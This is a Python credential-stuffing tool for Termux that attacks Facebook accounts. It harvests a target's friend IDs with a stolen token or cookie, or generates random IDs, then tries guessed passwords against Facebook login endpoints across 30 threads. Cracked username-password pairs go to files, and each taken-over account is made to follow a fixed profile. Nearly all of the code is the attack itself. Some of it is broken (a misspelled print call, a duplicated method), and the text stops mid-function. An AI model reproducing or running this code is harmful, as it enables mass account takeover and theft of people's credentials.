# Credit : mking

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
import os

try:
    import requests
except ImportError:
    os.system("pip install requests")

try:
    import concurrent.futures
except ImportError:
    os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests, bs4, uuid, json, os, sys, random, datetime, time, re, subprocess

try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote

# UA LIST
# ugen2=open('frec.txt','r').read().splitlines()
# ugen=open('m.txt','r').read().splitlines()
ugen2 = ['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser',
         'Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen = [
    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
# INDICATION
id, id2, loop, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = [], [], 0, [], [], [], [], [], [], [], []
cp = 0
ok = []
try:
    os.mkdir('/sdcard/')
except:
    pass
# COLORS
x = '\33[m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
K = '\033[95m'
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
# Converter
dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July',
       '8': 'Agustus', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July',
        '08': 'Agustus', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'


# CLEAR
def clear():
    os.system('clear')


# BACK
def back():
    login()


ahsan = "CHA-"
imt = "-M4786=="
ak = "CHANG-"
myid = uuid.uuid4().hex[:10].upper()
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
except:
    kok = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'w')
    kok.write(myid + imt)
    kok.close()


def login():
    try:
        token = open('.token.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?access_token=' + tokenku[0])
            public_menu()
        except KeyError:
            Public()
        except requests.exceptions.ConnectionError:
            clear()
            print(logo)
            print(' [×] WAKTU KONEKSI HABIS')
            exit()
    except IOError:
        Public()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e);
        sys.stdout.flush();
        time.sleep(0.01)


############### #LOGO############## ##

# LOGIN
def Public():
    clear()
    print(logo)
    print(' [01] LOGIN TOKEN\n [02] LOGIN COOKIE')
    pil = input('\n [#] MENU : ')
    if pil in ['1', '01']:
        panda = input(' [+] TOKEN : ')
        akun = open('.token.txt', 'w').write(panda)
        try:
            tes = requests.get('https://graph.facebook.com/me?access_token=' + panda)
            tes3 = json.loads(tes.text)['id']
            print(" [] LOGIN SUCCESS ")
            login()
        except KeyError:
            print(' [×] LOGIN FAILED ')
            time.sleep(2.5)
            Public()
        except requests.exceptions.ConnectionError:
            print(' [×] WAKTU KONEKSI HABIS')
            exit()
    elif pil in ['2', '02']:
        try:
            cookie = input(" [+] COOKIE : ")
            data = requests.get("https://business.facebook.com/business_locations", headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
                "referer": "https://www.facebook.com/", "host": "business.facebook.com",
                "origin": "https://business.facebook.com", "upgrade-insecure-requests": "1",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "max-age=0",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8",
                "content-type": "text/html; charset=utf-8"}, cookies={"cookie": cookie})
            find_token = re.search("(EAAG\w+)", data.text)
            ken = open(".token.txt", "w").write(find_token.group(1))
            print(" [] LOGIN SUCCESS ")
            login()
        except Exception as e:
            os.system("rm -f .token.txt")
            print(' [×] LOGIN FAILED ')
            time.sleep(2.5)
            login()
            exit()


def public_menu():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        exit()
    clear()
    print(logo)
    pil = input('\n [+] ENTER ID TARGET : ')
    try:
        koh2 = requests.get(
            'https://graph.facebook.com/v2.0/' + pil + '?fields=friends.limit(5000)&access_token=' + tokenku[0]).json()
        for pi in koh2['friends']['data']:
            id.append(pi['id'] + '|' + pi['name'])
        print(' [] Total : ' + str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        print(' [#] WAKTU KONEKSI HABIS')
        exit()
    except (KeyError, IOError):
        print(' [!] NOT PUBLIC OR TOKEN EXPIRE')
        exit()


def File():
    clear()
    print(logo)
    try:
        fileX = input('\n [+] MASUKAN FILE : ')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except IOError:
        exit("\n [!] FILE %s TIDAK DITEMUKAN" % (fileX))


def setting():
    hu = ("2")
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)

    elif hu in ['2', '02']:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = (bcm - 1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print(' [!] PILIH OPSI YANG BENAR')
        exit()
    clear()
    print(logo);
    print('\n [01] METODE 1 ');
    print(' [02] METODE 2 \033[1;97m')
    hc = input("\n [#] METODE : ")
    if hc in ['1', '01']:
        method.append('mobile')
    elif hc in ['2', '02']:
        method.append('free')
    else:
        method.append('mobile')
    passmenu()


def passmenu():
    clear()
    print(logo);
    print('\n [01] FIRST NAME DIGIT PASS \n [02] ALL NAME PASSWORD \n [03] ALL NAME+ PASSWORD')
    passmen = input('\n [#] PILIH PASS : ')
    if passmen in ['1', '01']:
        first()
    elif passmen in ['2', '02']:
        name()
    elif passmen in ['3', '03']:
        name2()
    else:
        passmenu()


def first():
    clear()
    print(logo);
    print(' [!] \033[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA HASIL\033[1;0m\n')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = ['445566']
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(free, idf, pwv)
            else:
                pool.submit(crack, idf, pwv)


def name():
    clear()
    print(logo);
    print(
        '\n [O] OK RESULT SAVED TO : \033[1;92mOK/%s\033[1;97m\n [C] CP RESULT SAVED TO : \033[1;91mCP/%s\033[1;97m\n [G] \033[1;96mGUNAKAN MODE PESAWAT 5 DETIK\033[1;0m\n' % (
        okc, cpc))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            try:
                idf, nmf = yuzong.split('|')
                xz = nmf.split(' ')
                if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                    pwv = [name, xz[0] + xz[0], xz[0] + xz[1] + "12345", xz[0] + xz[1] + "786", xz[0] + xz[1] + "123",
                           xz[0] + xz[1] + "1234"]
                else:
                    pwv = [name, xz[0] + xz[0], xz[0] + xz[1] + "12345", xz[0] + xz[1] + "786", xz[0] + xz[1] + "123",
                           xz[0] + xz[1] + "1234"]
                if 'mobile' in method:
                    pool.submit(crack, idf, pwv)
                elif 'free' in method:
                    pool.submit(free, idf, pwv)
                else:
                    pool.submit(crack, idf, pwv)
            except:
                pass


def name2():
    clear()
    print(logo);
    print(
        '\n [O] HASIL OK TERSIMPAN DI : \033[1;92mOK/%s\033[1;97m\n [C] HASIL CP TERSIMPAN DI : \033[1;91mCP/%s\033[1;97m\n [O] \033[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA HASIL\033[1;0m\n' % (
        okc, cpc))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = ['445566']
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '786')
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(free, idf, pwv)
            else:
                pool.submit(crack, idf, pwv)


# CRACKER
def crack(idf, pwv):
    global loop, ok, cp
    bi = random.choice([u, k, kk, b, h, hh])
    pers = loop * 100 / len(id2)
    fff = '%'
    sys.stdout.write('\r %s[ CHANG ] %s•%s • OK:%s • CP:%s  ' % (bi, loop, len(id2), len(ok), cp)),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            pw = pw.lower()
            ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get(
                'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p)).group(1), "uid": idf,
                     "flow": "login_no_pin", "pass": pw, "next": "https://m.facebook.com/login/save-device/'"}
            ses.headers.update(
                {"Host": 'm.facebook.com', "cache-control": "max-age=0", "upgrade-insecure-requests": "1",
                 "origin": "https://m.facebook.com", "content-type": "application/x-www-form-urlencoded",
                 "user-agent": ua,
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                 "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors",
                 "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                 "referer": 'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',
                 "accept-encoding": "gzip, deflate br", "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',
                          data=dataa, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                print(f'\r\x1b[1;91m [ CHANG-CP ] {idf} | {pw}')
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                coki = po.cookies.get_dict()
                coki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[1;92m [ CHANG-OK ] {idf} | {pw}')
                wrt = ('%s - %s' % (idf, pw))
                ok.append(wrt)
                open('/sdcard/ids/ok.txt', 'a').write('%s\n' % wrt)
                follow(ses, coki)
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def free(idf, pwv):
    global loop, ok, cp
    bi = random.choice([u, k, kk, b, h, hh])
    pers = loop * 100 / len(id2)
    fff = '%'
    sys.stdout.write('\r %s[ CHANG ] %s•%s • OK:%s • CP:%s  ' % (bi, loop, len(id2), len(ok), cp)),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            pw = pw.lower()
            ses.headers.update({"Host": 'mbasic.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://mbasic.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get(
                'https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p)).group(1), "uid": idf,
                     "flow": "login_no_pin", "pass": pw, "next": "https://mbasic.facebook.com/login/save-device/'"}
            ses.headers.update(
                {"Host": 'mbasic.facebook.com', "cache-control": "max-age=0", "upgrade-insecure-requests": "1",
                 "origin": "https://mbasic.facebook.com", "content-type": "application/x-www-form-urlencoded",
                 "user-agent": ua,
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                 "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors",
                 "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                 "referer": 'https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',
                 "accept-encoding": "gzip, deflate br", "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',
                          data=dataa, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                rint(f'\r\x1b[1;91m [ CHANG-CP ] {idf} | {pw}')
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                coki = po.cookies.get_dict()
                coki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[1;92m [ CHANG-OK ] {idf} | {pw}')
                wrt = ('%s - %s' % (idf, pw))
                ok.append(wrt)
                open('/sdcard/CHANG-OK.txt', 'a').write('%s\n' % wrt)
                follow(ses, coki)
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


def follow(ses, coki):
    ses.headers.update({"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text,
            'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text


logo = ("""\033[1;32m

╭───────────────────[\033[93mSIMPLE TOOLS FILE CRACK\033[1;32m]──────────────────╮
│ ┌──────────────────────────────────────────────────────────┐ │
│ │                   🃏 爪尺. 乙ㄖҜ੩尺                      │ │
│ └──────────────────────────────────────────────────────────┘ │
╰──────────────────────────────────────────────────────────────╯
╭──────────────────────── \033[93mINFO SCRIPT\033[1;32m ─────────────────────────╮
│ \033[93m╭──────────────────────────────────────────────────────────╮ \033[1;32m│
│ \033[93m│\033[1;32m  ░▐█▀█▒▐█▀▀▄░░▄█▀▄─░▐█▀█▒▐█▒▐▀  \x1b[1;96mGithub  \x1b[1;97m : \x1b[1;96mChangcuters   \033[93m│ \033[1;32m│
│ \033[93m│\033[1;32m  ░▐█──▒▐█▒▐█░▐█▄▄▐█░▐█──▒▐██▌░  \x1b[1;96mWhatsapp \x1b[1;97m: \x1b[1;96m0819-0776-1235\033[93m│ \033[1;32m│
│ \033[93m│\033[1;32m  ░▐█▄█▒▐█▀▄▄░▐█─░▐█░▐█▄█▒▐█▒▐▄  \x1b[1;96mFacebook \x1b[1;97m: \x1b[1;96mChangcuters  \033[93m │\033[1;32m │
│ \033[93m╰──────────────────────────────────────────────────────────╯ \033[1;32m│
╰──────────────────────────────────────────────────────────────╯\033[1;37m""")


class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print()
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║                  ─━㋱CRACK FILE CLONING㋱━─                   ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print("╭─────────────────── INFORMATION   AUTHOR ───────────────────────────╮")
        print("│ \033[32m╭──────────────────────────────────────────────────────────╮ \33[m│")
        print("│ \033[32m│                     ╦ ╦╔╗╦ ╔╗╔╗╔╦╗╔╗                     │ \33[m│")
        print("│ \033[32m│                     ║║║╠ ║ ║ ║║║║║╠                      │ \33[m│")
        print("│ \033[32m│                     ╚╩╝╚╝╚╝╚╝╚╝╩ ╩╚╝                     │\33[m │")
        print("│ \033[32m│  ─━㋱Auther:OSᗩᗰᗩ-1982 FACEBOOK : OSᗩᗰᗩ-ZAMZAM㋱━─     │ \33[m│")
        print("│ \033[32m╰──────────────────────────────────────────────────────────╯ \33[m│")
        print("╰──────────────────────────────────────────────────────────────╯\33[m")
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                 https://t.me/+U45CNKnoqu45YmI0               ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        print("╭──────────────────────────────────────────────────────────────╮")
        print("│ [1] CRACK FILE CLONING (\x1b[1;96mFREE\x1b[1;97m)                                │")
        print("│ [2] LOGIN TOKEN & COOKIES (\x1b[1;96mFREE\x1b[1;97m)                             │")
        print("│ [3] DUMP/MAKE FILE ID (\x1b[1;91mEROR\x1b[1;97m)                                 │")
        print("│ [4] CRACK RANDOM FB ID 2008-9 (\x1b[1;96mFREE\x1b[1;97m)                         │")
        print("│ [5] CRACK RANDOM FB ID 2011-14 (\x1b[1;96mFREE\x1b[1;97m)                        │")
        print("│ [6] CRACK RANDOM FB ID 2004-2005 (\x1b[1;96mEREE\x1b[1;97m)                      │")
        print("│ [7] CRACK RANDOM FB ID 2006-2007 (\x1b[1;96mFREE\x1b[1;97m)                      │")
        print("│ [K] EXITE PROGRAM                                             │")
        print("╰──────────────────────────────────────────────────────────────╯")
        TUTUL = input("  [P] SELECT MENU : ")
        if TUTUL in ["1", "01"]:
            File()
        if TUTUL in ["2", "02"]:
            Public()
        if TUTUL in ["3", "03"]:
            os.system("python Dump.py")
        if TUTUL in ["4", "04"]:
            self.old()
        if TUTUL in ["5", "05"]:
            self.old2()
        if TUTUL in ["6", "06"]:
            self.old3()
        if TUTUL in ["7", "07"]:
            self.old4()
            exit()
        else:
            print(" Select Correctly ")
            time.sleep(1)
            Main()

    def old(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        os.system('clear');
        print(logo)
        limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, Y))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (B))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (G, listpass))
                os.system("clear")
                print(logo)
                print("\n%s \x1b[1;97m[H] SAVED OK ACCOUNT : OK.txt" % (Y))
                print("%s \x1b[1;97m[H] SAVED  CP   ACCOUNT: CP.txt" % (G))
                print("%s \x1b[1;97m[O] ON/OFF MODE IF YOU NO RESULT\x1b[0m\n" % (P))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n [>>] CRACK COMPLETE...")
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        rua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        sys.stdout.write(
            "\r [ OSᗩᗰᗩ ] %s/%s -> Ok:-%s - Cp:-%s " % (self.loop, len(self.id), len(self.cp), len(self.ok))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": rua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                print("\r \033[0;92m Congrats Bro ")
                self.ok.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-Ok.txt", "a").write(" %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-OK.txt", "a").write(" %s | %s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1

    def old2(self):
        x = 1111111111
        xx = 9999999999
        idx = "10000"
        os.system('clear');
        print(logo)
        limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, Y))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (B))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (G, listpass))
                os.system("clear")
                print(logo)
                print("\n%s \x1b[1;97m[+] SAVED OK ACCOUNT : OK.txt" % (Y))
                print("%s \x1b[1;97m[+] SAVED CP ACCOUNT  : CP.txt" % (G))
                print("%s \x1b[1;97m[!] ON/OFF MODE IF YOU NO RESULT\x1b[0m\n" % (P))
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            exit("\n\n [>>] CRACK COMPLETE...")
        except Exception as e:
            exit(str(e))

    def api(self, uid, pwx):
        rua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        sys.stdout.write(
            "\r [OSᗩᗰᗩ] %s/%s -> Ok:-%s - Cp:-%s " % (self.loop, len(self.id), len(self.cp), len(self.ok))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": rua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                print("\r \033[0;92m Congrats Bro ")
                self.ok.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-Ok.txt", "a").write(" %s|%s\n" % (uid, pw))
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[ OSᗩᗰᗩ-OK ] %s | %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("2009-OSᗩᗰᗩ-OK.txt", "a").write(" %s | %s\n" % (uid, pw))
                break
            else:
                continue

        self.loop += 1

    def old3(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        os.system('clear');
        print(logo)
        limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))

            print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
                listpass = input("%s [?] ENTER PASSWORD :%s " % (G, Y))
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (B))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (G, listpass))
                os.system("clear")
                print(logo)
